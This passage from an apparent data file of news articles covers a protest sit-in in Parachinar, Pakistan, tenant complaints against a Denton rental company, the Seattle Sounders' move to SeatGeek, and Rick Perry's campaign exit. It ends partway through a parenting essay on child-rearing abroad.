cry, a protest or a greeting. Black sheep skitter about the roadsides, fat with wool. Graves adorned with plastic flowers line the route. Some of them have red flags. Those are the special ones. The ones who should not have been in the graves.\n\nThere are four of us in the vehicle, including activist Jibran Nasir, community worker Meena Gabeena and Elaaj Trust’s Dr Talha Rehman. Jibran had put out a call for people to accompany him to Parachinar to show solidarity. Didn’t feel like celebrating Eid this year given what happened, he says. Meena was keen to talk to the women and children and Talha to assess the health needs.\n\nOn the eight-hour drive from Islamabad, at one point you enter Fata—that mysterious land with the short acronym for a long name that is associated with the Taliban more than its own people. And as for Kurram Agency overall, it does not exist in the imagination. Its capital, Parachinar, just feels like a synonym for death.\n\nOn the map app, it is clear we are at the end of Pakistan. We are headed to that tip that juts out into Afghanistan so that it was dubbed Parrot’s Beak during British times. The geographical reality beggars belief. Fata feels like Pakistan in some seamless way that confounds divisions in the mind.\n\nThe only indication that you are entering fraught territory is the multiple check posts. At the agency’s entrance, Chapri’s Baab-e-Kurram, and beyond, cagey or blank jawans, depending on how high the sun is at that point in the day, ask you either of two deadpan questions: Where are you going. Where are you coming from. “We are from Karachi and are going to Parachinar,” says Jibran. We are struck by the oddity of that sentence. Some of the jawans peer into the vehicle and wave us on: the sight of two beatifically smiling women innoculates against the fear of a security risk.\n\n24hr protest\n\nVolunteers form layers of security and cordon off the approach to the dharna with a chicken coop that looks suspiciously like a caged bier. Everyone is patted down. Scissors and nail clippers are deposited on a bench. The dharna stretches on main Parachinar or bijli ghar road, from Edhi park to the Political Agent’s office behind a tall stone wall. Under canopies, on rugs, hundreds of men sit, shoulder to shoulder. Some of them have turned grey, others are as little as grandchildren. Their open faces are studies in anatomical sculpture with a history of remote genetic infusions. Farsi diphthong vowels inflect this Pashto tongue: Jibraan becomes JibrOWn.\n\nAt the end, on a platform is Muzammil. From June 23 the dharna has entered its sixth day, starting with 10 men and swelling to five thousand (by rough estimates). The men stay here 24 hours; cauldrons of rice are sent from villages and sherbet stalls keep up a supply of pink water. Muzammil keeps their spirits up. Shia ulema arrive as do a few political names from Quetta to show solidarity. But no one else is in sight.\n\nSaad Edhi announces that the foundation is setting up a centre so people do not have to travel 400km to get help. This will be the first one in Fata after the one in Mohmand Agency closed down during the operation. The announcement of three new ambulances is met with murmurs of ‘MashaAllah’. Edhi is well-loved here. Everyone remembers how he was turned away in 2008 when he tried to enter the agency to help.\n\nMuzammil introduces Jibran, who gets down to business. He is a consummate public speaker, who has come prepared with cultural references he knows will resonate with these people. He enthralls them with couplets that encapsulate their victimhood and survivals. But most of all, he gives them what they have been hungering for: acknowledgement of pain. He opens with an apology. Not enough media is paying attention. No national leaders have deigned to come. One dharna participant quips about rumours that a major VVIP is scheduled to come via helicopter: “Even if he came walking from Islamabad he would have reached sooner.” There are anguished comparisons to Bahawalpur. Jibran uses the word ‘shame’. He tells them he is not Shia. He tells them he is here. And then, in a theatrical flourish he discards the microphone, cranks his arm up like a lever as if to raise the crowd in his open palm, and with all his vocal strength sends out a “NaraAA-E-HAIDERIII!” The crowd roars back. Far better to expel the anger vocally than to let it turn into something physical that spirals out of control. This is the discipline of the dharna; it brings together rage, compresses it, and gives it controlled release. “The youth are respected,” observes Meena, who translates from the Pashto. “And they respect the elders.” Speaker after speaker reminds the young men that theirs is not the way of the gun, but of patience.\n\nPeople comes to share stories and boost morale. Haji Sher Hassan has lost three sons. “Even if ten of my sons were shaheed, I would still say I sacrifice them in the name of Hussain (RA),” he says. He donates Rs160,000 to the dharna. Muzammil weeps as he reads out a note from a woman who offers Rs35,000 set aside for her wedding dress. An anguished Parachinar man who heard this sent a message from Australia that he would send Rs100,000 in her lieu.\n\nThe dharna has a list of demands some of whose points are: Parachinar’s safety be ensured. The FC’s policy in Parachinar has been “biased” and so the Kurram (Turi) militia be returned and the city’s security be handed to them. “On the basis of need, Turi tribesmen be inducted for new wings in the FC. And local volunteers be made part of security.” They want the red zone to be scrapped and a security plan prepared which does not inconvenience residents. (Translated from Urdu).\n\nIt is not difficult to understand the raw sentiment that gives rise to these demands. They express a reaction of wounded people. And it is not the time or place to object, but some locals indicate that they know it will not be possible for the authorities to implement them. For the sixth day of the dharna, however, the focus is getting the country’s attention. Finding solutions to preventing the bloodshed will be harder. There is a long and complex history to it.\n\nTroubles begin\n\nParachinar’s troubles, specifically sectarian violence, can, in part, be dated to the Afghan war in 1979. The tyranny of geography is such that Parachinar sits at the tip of that fin-like part of Pakistan that is surrounded by three Afghan provinces. It is closer to Kabul than Peshawar, which is why it is seen as strategically important—not just for the Mujahideen but for Pakistan as well. Its surrounding areas served as a launch pad.\n\nAt that point in time, Parachinar’s population was generally understood to be mixed, Shia and Sunni. “The arrival of the Afghan muhajireen changed the balance of Kurram,” claims journalist Hidayat Pasdar Ali, who has been writing since 1999. According to him, many mujahideen were given sanctuary in Kurram. The Turis, who are mostly Shia, were not impressed, he says. That’s when the “khitchri” started cooking. This is, however, the isolated perspective from Upper Kurram and these interpretations of ‘history’ are obviously presented through the lens of the individual. For the purposes of this article, due to several constraints, it was not immediately possible to independently verify these assertions. Let it be clear, as well, that the voice of the Sunnis and that of the people from central and lower Kurram could not, with regret, be included. Conflicting narratives emerge from lower and central Kurram on the causes and origins of the sectarian strife. It was also not possible to gain the perspective of the Political Agent or the IG FC, despite repeated requests for interviews. And while one does not want to give the impression that the narrative presented in Parachinar is flawed given how much they have suffered, it would not be fair to proceed without alerting the reader that this is just one, albeit important, side of the story.\n\nPost-Afghan war, says Hidayat, there was relative peaceful coexistence—until the advent of the Taliban. According to the people interviewed, it was in 2006 and 2007 that the Taliban started to eye Parachinar, which was a prized stronghold that provided access to Afghanistan. They say that they started to notice “Taliban elements”. “We knew that something was wrong because [a] madrassa was getting 400 rotis a day,” says Jamshed Ali. The madrassa students ate at home as they were day students, so who needed 400 rotis?\n\n“They wanted to take over,” says Hidayat. “There were messages, that Amir saheb doesn’t like this and Amir saheb doesn’t like that.” He recalls returning home in 2006/7 to find wedding dancing in Alizai. The wedding had ended days ago, but they were still dancing because a note had been sent saying that there should be no music and dancing.\n\nNotes were reportedly sent to music centres, telling them to close. This, say the men interviewed for this piece, became a nuisance. But it was not as if the Sunnis were also not suffering. The squeeze was put on them as well. According to some accounts, people were being forced to take sides. “They would have killed them if they resisted,” claims a young resident, Basharat. And indeed many were. Kurram began to experience what many other places were experiencing in those years.\n\nThen came April 6, 2007. According to all the people spoken to for this article, on 12 Rabiul Awal a procession emerged from the central mosque with some men shouting incendiary slogans. People thought there would be talks to handle the matter, say Prof Tahir Hussain, Ashiq Husain, Liaquat Hussain and Jamshed Ali. A few days later, a 17 Rabiul Awwal jaloos attempted to respond in kind with counter slogans. That’s when the firing erupted in the streets. The mosque and the markazi imambargah are located smack opposite each other. Four boys were shot dead and in 24 hours the toll rose to 64 with 700 injured. Lashkars were formed in surrounding villages. “They are all cousins so they get organised,” says Jamshed Ali. (These accounts could not be independently verified).\n\nIsolation\n\nSubsequently, it is said that the Taliban closed off the road into Parachinar, in 2007. This is when the isolation began. People say they were forced to exit via the check posts into Afghanistan (Kharlachi, Burki, Tirimengal and Malikhel). You would then take a perilous 48-hour journey via Kabul to re-enter from Peshawar. “My two daughters could not go to medical school,” says Ashiq Hussain, who everyone calls ‘Daddy’ because he is the pioneer and backbone of Haidery Blood Bank. He told them that there was no way he could take them via Kabul. They wept for days. “We could not breathe until we knew our son had reached safely.” One of Ashiq’s sons insisted that he had to get out, despite his father’s pleas. He went to Australia to seek asylum.\n\nAnd so, you literally had to go to another country to get into your own from 2007 to roughly 2012. People say they would take one trip a month. But even taking this route was no joke as they ran the risk of abductions. “In those years we didn’t even eat a single Pakistani toffee,” says one man. “We decided we would eat grass but we would not give the Taliban way.”\n\nBetween 2007 and 2011, an estimated 56 villages were burnt with entire families perishing in some cases, according to Parachinar residents. Abid Ali Shah Kazmi’s father, a principal in Jamrud, was apparently slaughtered, some say in front of his eyes. He had been openly threatened on the radio. In kidnappings, ransoms of Rs150,000 were reportedly demanded. In 2008, eight truck drivers and eight conductors bringing a convoy of rations to Parachinar, protected by six FC vehicles and a helicopter, were reportedly ambushed and slaughtered, by the accounts of the men in Parachinar. “We were not even able to get to their bodies,” says Liaquat of the Haidery Blood Bank.\n\nSome people claim that salaries for government employees would have to be brought in helicopters during the times when the road was closed off. And while it was not possible to independently verify, many men in Parachinar say that many of their Sunni neighbours were forced to leave out of fear or coercion or for other reasons. Business from Afghanistan (fruit) and Iran (dates, dairy products) thinned out. Afghan SIMs were more effective but the government cracked down on them. (You apparently need an NoC for any other kind of solution like a satellite system.) Cellular 3G services stopped a year ago. Now you need a PTCL landline to get the internet. Only Jazz numbers work here.\n\nIt was in 2011 that the Tall-Parachinar road was opened after the government put its weight behind the effort. A slow process of getting Sunni families to return began, say many men. In 2012 there was a jirga at Governor House. Ashiq Hussain was there. According to his version of events, the Sunnis asked for guarantees. “I stood up and said that there were eight qaums (tribes) here and I would speak on behalf of all of them that no harm will come to even one of your chickens,” he recounts. He claims that the Sunnis were terrified of being seen as making a pact with the Shias of Parachinar to return. “We can’t even tell our wives at home anything political,” he quotes them as saying at the jirga. If even one woman shared information with a friend it ran the risk of being found out. “They kidnapped anyone who spoke against them in Sadda.”\n\nTurning point\n\nOn Friday morning, dharna day 8, COAS Gen Qamar Bajwa arrives. According to Mehdi Hussain, a small group of Parachinar men in Islamabad had met Air Marshal Syed Qaiser Hussain to apprise him of the concerns earlier on. They had, he says, conveyed that the dharna would stay until the COAS came to Parachinar.\n\nMuzammil Agha and a team of dharna representatives say they spent two hours with Gen Bajwa. “He was calling me beta, so I said, if he was considering me that, then he should listen to me as an elder,” says Muzammil. And indeed, he says a frank discussion followed so much so that the team felt that they had been properly heard out. One complaint is that the FC wing positioned in Parachinar is made up of outsiders, tribals from other agencies. In the 1980s, there was a change of policy and the Kurram militia men were posted out of Kurram and other militia were brought in. Now the demand is that the Kurram or Turi militia (of locals whether Shia or Sunni) be allowed to protect Parachinar. It became clear in the meeting, however, that this demand would not necessarily work because of certain considerations. And while the people of any area can work with security forces, it is not the norm for them to tell them how to do their job. Locals should be engaged with the authorities on informing them about their needs in the city; it perhaps does not make much sense for them to be making the security plan.\n\nAdditionally, it would not set a good precedent to have an all-Shia militia. The army’s recruitment simply doesn’t distinguish along those lines. Furthermore, there are good reasons why outside forces are preferred for an area in order to maintain discipline and the integrity of law and order efforts. However, what was agreed upon is that the existing FC wing would be moved out and another be brought in, according to Mehdi Hussain.\n\nThe ISPR issued a press release on June 30 after the meeting and clarified many points. “While administrative concerns will be pursued with the executive body, suggestions regarding security mechanism[s] are being incorporated forthwith. We can only be effective when locals are part of the security and vigilance,” the COAS said.\n\nIt is important to note, as the ISPR states, that to date 126 soldiers of FC KP alone “have laid [down] their lives and 387 have [been] injured while performing security duties in Kurram Agency [alone]”. “FC KP is a professional force inclusive of all tribes and sects performing their duties selflessly,” the COAS said.\n\nThe second point that was raised at the dharna concerned the alleged firing after the blast that day. “Firing by FC troops while handling mob situation post blast is being inquired and those responsible shall not be spared,” the ISPR said. In any event, a full investigation is the only way to ascertain what happened. According to some reports, CCTV cameras were broken by protesters. An argument is presented that the protesters could have been deterred by aerial firing. “Pathan aerial firing se kidhar bhagta he,” said one Parachinar man in response to that argument. “You think aerial firing scares a Pathan off?”\n\nAnother demand concerned FC commandant Col Malik Umar, who had attracted the ire of the residents. The demand was that he leave. “FC commandant has already been changed,” the ISPR stated. It also went into detail about how the army would also set up a trauma centre and the government will be offering the victims compensation, all points raised by the dharna.\n\nAccording to Mehdi Hussain, the success of the dharna was that a “sincerity” emerged in listening to the people. On Monday, Governor Iqbal Zafar Jhagra distributed one million rupees for the martyrs and Rs500,000 for the injured.\n\nThe challenge now is how to secure the city. “The entire city can’t be turned into a red zone,” argues journalist Hidayat. The bomb blast on June 23 took place outside it. “There were 50 applications to end the red zone,” he claims. And it is easy to see how shopkeepers may be against it. The check posts have long lines. The ISPR addressed these points too: “Additional Army troops have been moved in Parachinar to enhance its security. [W]hile FC troops are being beefed up on Pak-Afg border to seal it effectively. T[u]ri Razakars are also being dovetailed on check posts.” A safe city project will be undertaken by installing CCTV cameras as has been done in Lahore and Islamabad.\n\nAnd so, for this last city at the end of Pakistan, it appears that something has changed. Parachinar is no longer on its own. Pakistan is listening.\n\nTuri militia & FC\n\nIn order to understand the dharna’s demands that the FC’s Kurram militia be manned by locals, a historic note is in order. The FC is made up of several groups such as the Chitral Scouts, Khyber Rifles and the Mohmand Rifles. One of them is the Kurram militia. Many Turis generally agree, according to Khan Barmazid’s blog ‘A History of the Pashtun’, that they are of Turkic origin and were nomads who came to settle in Kurram valley to displace and fight the Bangash tribe here. (Historian Sir Olaf Caroe disagrees). Eventually they took over the valley and the Bangash compromised. For years they had a rebellious relationship with Kabul. At one point, fed up with the Afghans, the Turis welcomed the British who had ejected the Kabul government from Kurram in 1879. The British government declared that Kurram was a protectorate in 1892 and the Turi militia was raised, recruiting locals. It was initially based at Balish Khel near Sadda, but within a few months the headquarters were moved to Parachinar, and it was renamed the Kurram militia.\n\nThe name Parachinar\n\nThere are several theories to the name Parachinar city. The most obvious one pegs it to the chinar or maple leaf tree that grows here. Kurram Agency also had a pre-Turi tribe known as the Para Chamkani, who used to convene their meetings under the chinar tree to resolve problems, according to resident Shahid Kazmi. Parachinar’s old name is Tootkai and in Afghanistan some people still call it that. The name was changed in about 1910 or 1920.",
  "latent_3550": "Adalberto Toledo | Senior Staff Writer\n\n@aldot29\n\nKyle Martin | Staff Writer\n\n@Kyle_Martin35\n\nScott Brown Properties has been in Denton since the 1990’s and currently rents to roughly 3,000 tenants, but many current and former residents have recently been vocal about bugs, mold, foundation issues, bad customer service and other issues on the properties.\n\nRoughly 3,000 tenants dwell in 1,400 Scott Brown Properties, which translates to 13.1 percent of Denton’s renting population, of whom 75 to 80 percent are UNT and TWU students.\n\nBiology senior Zoe Pratt is one of those students. Pratt looked into a duplex on the 600 block of Amarillo Street in August 2014 after a frantic search for a place to live yielded little return.\n\nWhen seeing the house for the first time, Pratt said the first thing she saw walking into the duplex was a dead bird hanging from the front porch section. Walking in, Pratt said, revealed a distraught, unkempt house with a two-foot-wide hole in the ceiling with drywall hanging from it and mold throughout. She said the agent guiding the tour of the house told her not to worry and that Scott Brown Properties would fix all the damage in time for them to move in.\n\n“They fixed the hole in the ceiling, but I started moving my stuff in and was walking around the carpet, and I realized that there were bugs on me,” Pratt said. “So I called my friend and I had him come over, and we walked around and he was like, ‘These are fleas.’”\n\nPratt said because she is allergic to mold, the discovery forced to wait another month before moving into the house, due to unlivable conditions. Further inspection of the residence, Pratt said, revealed multiple other flaws, including visible holes in the floors that went down to the foundation, as well as mold in one of the closets.\n\nAccording to the Center For Disease Control and Prevention, people who have immune system complications and chronic lung diseases have increased risk of fungal infection in the lungs.\n\n“There was so much mold that I just couldn’t even breathe at all, but there wasn’t anything that you could do about that,” Pratt said “They just said it was an old place, so I was like, ‘That sucks I can’t breathe in my own home.’”\n\nPratt is not the only student who has had problems with mold. Other Scott Brown Properties residents found similar conditions in their houses.\n\nOne particular current Scott Brown tenant, who has asked to remain anonymous because he is still a tenant, used a home testing kit to find toxic mold in his property. They said that after notifying Scott Brown’s offices of the mold, “they refused to check for toxicity” and gave them “a bottle of some bleach spray and said to clean it.” After repeated calls, e-mails and visits to the offices, the resident said their mold problems still have not been taken care of.\n\nA former Scott Brown tenant, marketing senior Colin Wheeler, began renting in June 2014 and said during his 12-month lease, he and his roommates still came across issues with his house, including mold.\n\nThough the properties may be in poor condition when a tenant views it, Scott Brown property manager Jay Brakefield said the company tries hard to make repairs. He added that it’s difficult to deal with both the tenants and the investors and owners of the properties they manage, calling the owners the backbone of the business.\n\nBut Brakefield said a student would never rent out a place if they saw it in poor condition.\n\n“If a house is bad, nobody needs to be living in it,” Brakefield said. “But what do you do? The owner’s calling you, ‘You got that place rented?’ You’ve got to tell the owner something. We work for the owner.”\n\nBrown said his company is trying to “weed out” the owners who do not meet his company’s standards, and that what he really wants to emphasize is neither he nor the company owns everything that their sign is on.\n\nA local business\n\nThe company’s standards have developed along with Brown.\n\nWhen Brown was 17 years old he bought his first rent house with $10,000 his father gave him for his high school graduation. Brown said when his father offered to buy him a new car after graduation, he instead took the money and invested in a house, with his father as co-signer. In 1992, he began his surge into the housing and real estate business with Scott Brown Properties.\n\n“The way I bought the other ones through college is I’d sit down with older couples who already had their houses paid for, they didn’t have any debt on them, and I’d go have dinner with them or take pizza over or whatever,” Brown said. “And I’d sit in there on Friday nights and have pizza with these people, and they would own or finance for me so I didn’t have to go to the bank.”\n\nBrown graduated from UNT in 1986 with a degree in management and real estate living. He drove a bus for most of his time at UNT to keep money in his pocket and bought the current offices of Scott Brown Properties in 1999 – a five acre plot on the 1400 block of Dallas Drive.\n\nSince his business began, Brown said he’s made an effort to keep a one-on-one relationship with his investors and his tenants. He also said owners need to take responsibility for their properties – not just the company.\n\n“Scott’s taken a personal interest to go out into town and look at the properties that we manage, and he’s looking to really get these owners in here,” Brakefield said of Brown. “I mean [the house on] Amarillo, if you look at every house around there, it’s been remodeled. And the guy who owns that, I’ve personally contacted [him] and said, ‘Hey every house around you is been remodeled. Let’s do something with your house.’”\n\nMold only the beginning\n\nAfter dealing with the mold, fleas and other problems at the Amarillo Street house for a month, Pratt decided to get out of her lease, though it was not an easy process.\n\nShe finally moved out of the property in November 2014, believing she was in the clear with Scott Brown Properties. However, Pratt received a call from her roommate in January long after she had already left the house because her name still appeared on the lease.\n\nShe decided to formally break the lease, and over the next few months she created an itemized list of things wrong with the house that she believed were violations on the part of Scott Brown Properties and hand-delivered it to their offices. In the end, she said Scott Brown Properties agreed to use the owed first month’s rent to waive her lease-breaking fees, but having no record of the agreement, Scott Brown Properties could not break the lease.\n\nBrakefield said breaking a lease is a very difficult process because the tenant signed a legal document agreeing to pay rent until the term is over. He said the typical process is to ask the tenant to find a new tenant for that property, and then the lease could be broken. “We’re very personable people up here,” Brakefield said. “I mean, what’s to stop anybody from coming through that door and saying, ‘Hey, I need help.’ We’ll do our best to help out anybody.”\n\nThe duplex on the 600 block of Amarillo has since been off the market. Brakefield said the property is not currently being rented out due to foundation issues, and leasing agent Maggie Quam said the house is currently going into “pretty heavy construction” and does not know when it will be available to rent out again.\n\nMore concerns from more tenants\n\nPratt and her roommate said they had been to the Scott Brown Properties offices several times before and met people with the exact same problems as her. She said one time in particular, she arrived to the offices to find a line out the door of tenants, all of whom were looking to voice complaints.Wheeler shared similar objections about his time with Scott Brown Properties.\n\n“The previous tenants were just terrible. It was really, really gross,” Wheeler said. “They hadn’t moved out yet at all. We walked in and it was still lived in, they just weren’t there, and it was disgusting. It looked like they had five or six cats and they just peed everywhere all the time. It smelled awful.”Wheeler didn’t stress about the mess because he knew it would be cleaned before they moved in. For the most part, according to Wheeler, it was cleaned upon move-in.\n\nThis is because, according to Brown, the company conducts a “make-ready” on each property to prepare for a new tenant. He said they do about 300 make-readies during the summer months – their busiest time of the year. But even after the make-ready, Wheeler said other issues, including mold and a damaged bathroom, were things he had to fix himself due to lack of response from Scott Brown Properties. “We tried to get that at least looked at or fixed pretty much from the get-go whenever we first moved in,” Wheeler said. “But that never got looked at, I don’t think, once.” However, he couldn’t fix one particular incident. He believes Scott Brown Properties lost one of his rent payments.\n\nAfter checking with his bank and confirming the rent check had been withdrawn from his account, Wheeler still received a notice in his mailbox from Scott Brown Properties, warning of missing rent. Wheeler said he had to pay rent for a second time and later received a call from Scott Brown Properties that said they would refund his missing check combined with his security deposit.\n\nBut a month and a half after moving out of the house, the solution went awry.\n\n“It was strange because they divided up the security deposit three ways, because there were three people living there, and I think he also divided up the money he was going to pay me back,” Wheeler said. “So I never really got all of my money back for that, but I just stopped caring. It had been such a long time.”\n\nOverall, Wheeler said his time with Scott Brown Properties wasn’t “that bad of an experience,” but still found drawbacks and failings on their part.\n\nUNT senior Maddie Migis said her time with Scott Brown Properties has been good, saying she’s had only good experiences, feels her rent price is “more than fair,” and the maintenance have been “good, quick, and polite.” She added she has nothing negative to say and that she “absolutely love[s]” Scott Brown Properties.\n\nA “First Class” company\n\nWith all of these problems that some of Scott Brown Properties residences have, many previous customers have made it clear that they would never rent from the company again and added that they would not recommend them to new tenants.\n\nScott Brown himself sees a problem with previous tenants leaving properties messy and said those are usually the people with the most complaints.\n\n“It seems that the tenants that pay their rent late or don’t pay and then they party and tear the places up, they’re the ones it seems like with the most talk,” Brown said.\n\nBrakefield added Scott Brown Properties is doing everything “within [their] limits” to keep their properties in the best condition possible, but admits “there are some bad rent houses out there.”\n\nBrown said he feels that “without a doubt” his staff adequately manages the properties his company owns and manages. He said his office is “first class.”\n\n“I’ve worked since I was 17 building all this stuff, and I’m doing the very best I can do and I care about people,” Brown said. “If they’ve got a problem, they come sit right here and talk to me.”\n\nHe said his work is made more difficult by these types of situations, and that he wants to do everything in his power to keep his tenants happy.\n\n“I mean, [if] the tenant’s miserable, we’re miserable,” Brown said “We don’t want mad tenants. I don’t want any tenant leaving us unhappy.”\n\nFeatured Image: 609 and 611 Amarillo St. Graphic Illustration. Tomas Gonzalez | Visuals Editor",
  "latent_3665": "Goodbye, Ticketmaster. Hello, SeatGeek.\n\nThe Seattle Sounders on Wednesday announced a new deal with SeatGeek, a New York-based startup that offers a unique “open ticketing platform” and a focus on mobile apps.\n\nSeatGeek will become the official ticketing partner of the Sounders starting in 2018. It marks the end of a nine-year partnership with industry incumbent Ticketmaster.\n\nFounded in 2009 and equipped with $160 million in investment, SeatGeek has differentiated itself from other ticketing platforms with SeatGeek Open, which lets teams, artists, and others sell tickets across the internet and directly within other apps and websites.\n\nIt’s different than Ticketmaster, which uses a closed system that restricts how and where people buy and transfer tickets.\n\nThere are a number of big changes that will impact fans. SeatGeek prides itself on making it easy for fans to resell their tickets.\n\nIn addition, the Sounders — or anyone — will be able to sell tickets directly within a third-party app. That means Uber or Airbnb could include Sounders tickets as part of a deal, or the team itself could sell tickets directly within your Facebook News Feed.\n\nCurrently on the Sounders ticket website, it reads: “… if you are looking to buy or sell tickets to sold out matches don’t forget to check out Ticket Exchange, the only Sounders FC approved place for fans to resell their tickets.”\n\nThat will change next year.\n\nSounders FC COO Bart Wiley told GeekWire that improving the fan experience was the primary reason for why the club went with SeatGeek.\n\n“We felt like SeatGeek gave us chance to be both innovative and creative when it comes to how fans interact with their ticketing platform,” he said.\n\nWiley said the Sounders are appreciative of Ticketmaster for partnering with the club for nearly a decade. But he noted that SeatGeek “opens doors that potentially we weren’t able to open before.”\n\n“It allows us to be really creative and flexible, and allows us to daydream together about ways to make the fan experience with their ticket as easy, seamless, and efficient as possible,” Wiley said.\n\nWiley said SeatGeek’s mobile experience is “seamless, easy to navigate, and efficient.”\n\nSeatGeek started as a secondary market ticket aggregator but has since turned its focus on the primary market. The company became the official ticketing partner of the MLS last year and employs more than 250 people across nine offices worldwide.\n\nOther MLS clubs like Sporting KC; New York; Portland; and Minnesota also plan to use SeatGeek as their official ticketing platform.\n\nAdding the Sounders to its customer list is a big deal for SeatGeek; the club consistently leads the MLS in attendance and boasts one of the more robust fanbases in all of North American professional sports. The club has also been open to testing new technology and is based in one of the world’s technology hubs.\n\n“We’re thrilled to be working with one of the most exciting teams in all of professional sports,” SeatGeek co-founder Russ D’Souza said in a statement. “We’re confident the SeatGeek platform will give Seattle supporters easy access to matches and help the club reach an even wider audience. It’s going to enhance an already top-notch fan experience.”\n\nOther leagues are also thinking about moving to an open ticketing system; the NFL is “likely” to end its exclusive partnership with Ticketmaster next year, the New York Business Journal reported.\n\nD’Souza, who co-founded SeatGeek with Jack Groetzinger and Eric Waller, spoke about the company’s technology and strategy at our GeekWire Sports Tech Summit in June.\n\n“We really, really want developers to come and integrate with us and to extend our system in all these different ways,” D’Souza said on stage at the GeekWire Sports Tech Summit. “A team would be able to, rather than just buying the SeatGeek platform, they are instead getting the SeatGeek back-end system and also all these other third parties that do what they do better than we ever could. We’re never going to build the next Salesforce — why would we even try to? Instead, we hook into these guys and let a team leverage and use the technology.”\n\nD’Souza noted how an API that allows the re-issuance of tickets also helps prevent fraudulent tickets.\n\n“When verification is an important marketing leg of a primary ticketing company’s marketing message, they are actually opposed to making it more broadly distributed,” he explained. “To put it succinctly, they want fraud. They want people to have those bad experiences because it helps their larger marketing message of, ‘go buy from one verified ticketing site.’\n\n“We think that’s silly,” he continued. “We think that if you create friction for consumers at all, then you’re just hurting the rights holder and you’re making it more difficult and more of a challenge for a fan who wants to attend an event. It’s another thing in the back of their mind that’s keeping them out because they aren’t sure if it’s a verified ticket or not. If we do our job right, in 10 years, the concept of verified tickets doesn’t exist because a ticket is a ticket, and everyone will get it, and they’ll know they can get in.”\n\nHere’s more insight into SeatGeek’s philosophy, via D’Souza:",
  "latent_3727": "Former Texas Gov. Rick Perry. AP Photo/Paul Sancya Former Texas Gov. Rick Perry suddenly announced he was suspending his presidential campaign Friday.\n\nAs he did so, he made it abundantly clear that he's still not a fan of real-estate mogul Donald Trump, the Republican front-runner in the race with whom he has often feuded.\n\nSpeaking at an event in St. Louis, Missouri, Perry repeatedly jabbed at Trump's campaign-trail controversies without using his name.\n\n\"Demeaning people of Hispanic heritage is not just ignorant, it betrays the example of Christ,\" Perry said, according to his prepared remarks. \"We can enforce our laws and our borders, and we can love all who live within our borders, without betraying our values.\"\n\nThis was a reference to Trump's heated rhetoric against illegal immigration, which spurred a nationwide controversy when the developer launched his campaign in June. Perry previously likened Trump's immigration activism to the US's 19th-century \"Know Nothing\" movement, which shunned Catholic immigrants from Ireland and Germany.\n\n\"It is time to elevate our debate from divisive name-calling, from sound bites without solutions, and start discussing how we will make the country better for all if a conservative is elected president,\" Perry said Friday.\n\nPerry also bashed \"celebrity\" presidential candidates during his exit speech.\n\n\"For me, the message has always been greater than the man,\" he said in his prepared remarks. \"The conservative movement has always been about principles, not personalities. Our nominee should embody those principles. He — or she — must make the case for the cause of conservatism more than the cause of their own celebrity.\"\n\nTrump has generally responded aggressively to Perry's provocations, going as far as to question Perry's intelligence and suggesting that there should be an IQ test for the Republican presidential debates.\n\nOn Friday, however, Trump responded to Perry's departure by praising the former governor:\n\nDespite his exit, Perry could still have a potentially lasting effect on the race. Notably, the super PAC backing his White House bid raised a reported $17 million.\n\nBack when Perry's campaign was still foundering, a New York Times report speculated that the money could be used to help take down Trump, whom Perry has labeled a \"cancer\" on the conservative cause. At the time, an adviser to the pro-Perry super political action committee insisted to The Times that the effort was singularly focused on boosting Perry's candidacy.",
  "latent_3746": "The eager new mom offering her insouciant toddler an array of carefully-arranged healthy snacks from an ice cube tray?\n\nThat was me.\n\nThe always-on-top-of-her-child's-play parent intervening during play dates at the first sign of discord?\n\nThat was me too.\n\nWe hold some basic truths as self-evident when it comes to good parenting. Our job is to keep our children safe, enable them to fulfill their potential and make sure they're healthy and happy and thriving.\n\nThe parent I used to be and the parent I am now both have the same goal: to raise self-reliant, self-assured, successful children. But 12 years of parenting, over five years of living on and off in Japan, two years of research, investigative trips to Europe and Asia and dozens of interviews with psychologists, child development experts, sociologists, educators, administrators and parents in Japan, Korea, China, Finland, Germany, Sweden, France, Spain, Brazil and elsewhere have taught me that though parents around the world have the same goals, American parents like me (despite our very best intentions) have gotten it all backwards.\n\nWhy?\n\nWe need to let 3-year-olds climb trees and 5-year-olds use knives.\n\nImagine my surprise when I came across a kindergartener in the German forest whittling away on a stick with a penknife. His teacher, Wolfgang, lightheartedly dismissed my concern: \"No one's ever lost a finger!\"\n\nSimilarly, Brittany, an American mom, was stunned when she moved her young family to Sweden and saw 3- and 4-year-olds with no adult supervision bicycling down the street, climbing the roofs of playhouses and scaling tall trees with no adult supervision. The first time she saw a 3-year-old high up in a tree at preschool, she started searching for the teacher to let her know. Then she saw another parent stop and chat with one of the little tree occupants, completely unfazed. It was clear that no one but Brittany was concerned.\n\n\"I think of myself as an open-minded parent,\" she confided to me, \"and yet here I was, wanting to tell a child to come down from a tree.\"\n\nWhy it's better: Ellen Hansen Sandseter, a Norwegian researcher at Queen Maud University in Norway, has found in her research that the relaxed approach to risk-taking and safety actually keeps our children safer by honing their judgment about what they're capable of. Children are drawn to the things we parents fear: high places, water, wandering far away, dangerous sharp tools. Our instinct is to keep them safe by childproofing their lives. But \"the most important safety protection you can give a child,\" Sandseter explained when we talked, \"is to let them take... risks.\"\n\nConsider the facts to back up her assertion: Sweden, where children are given this kind of ample freedom to explore (while at the same time benefitting from comprehensive laws that protect their rights and safety), has the lowest rates of child injury in the world.\n\nChildren can go hungry from time-to-time.\n\nIn Korea, eating is taught to children as a life skill and as in most cultures, children are taught it is important to wait out their hunger until it is time for the whole family to sit down together and eat. Koreans do not believe it's healthy to graze or eat alone, and they don't tend to excuse bad behavior (like I do) by blaming it on low blood sugar. Instead, children are taught that food is best enjoyed as a shared experience. All children eat the same things that adults do, just like they do in most countries in the world with robust food cultures. (Ever wonder why ethnic restaurants don't have kids' menus?). The result? Korean children are incredible eaters. They sit down to tables filled with vegetables of all sorts, broiled fish, meats, spicy pickled cabbage and healthy grains and soups at every meal.\n\nWhy it's better: In stark contrast to our growing child overweight/obesity levels, South Koreans enjoy the lowest obesity rates in the developed world. A closely similar-by-body index country in the world is Japan, where parents have a similar approach to food.\n\nInstead of keeping children satisfied, we need to fuel their feelings of frustration.\n\nThe French, as well as many others, believe that routinely giving your child a chance to feel frustration gives him a chance to practice the art of waiting and developing self-control. Gilles, a French father of two young boys, told me that frustrating kids is good for them because it teaches them the value of delaying gratification and not always expecting (or worse, demanding) that their needs be met right now.\n\nWhy it's better: Studies show that children who exhibit self-control and the ability to delay gratification enjoy greater future success. Anecdotally, we know that children who don't think they're the center of the universe are a pleasure to be around. Alice Sedar, Ph.D., a former journalist for Le Figaro and a professor of French Culture at Northeastern University, agrees. \"Living in 